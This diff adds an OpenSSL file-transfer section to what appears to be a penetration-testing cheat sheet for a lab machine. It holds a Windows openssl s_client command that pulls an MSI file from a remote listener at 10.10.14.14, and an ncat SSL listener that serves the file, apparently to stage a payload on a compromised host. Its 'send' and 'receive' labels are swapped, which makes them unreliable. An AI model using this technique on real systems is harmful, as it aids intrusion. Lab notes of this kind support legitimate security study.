@@ -761,3 +761,19 @@ socat - OPENSSL:IP:PORT,verify=0
 * \- = transfer data between STDIO
 * OPENSSL = establish SSL connection
 * verify=0 = disable SSL verification
+
+# OpenSSL Transfer
+
+We can also use openssl.
+
+Send the file (Windows):
+
+```cmd
+c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136 > c:\users\public\desktop\shortcuts\msi.msi
+```
+
+Receive the file:
+
+```sh
+ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 136 < Ethereal.msi  
+```
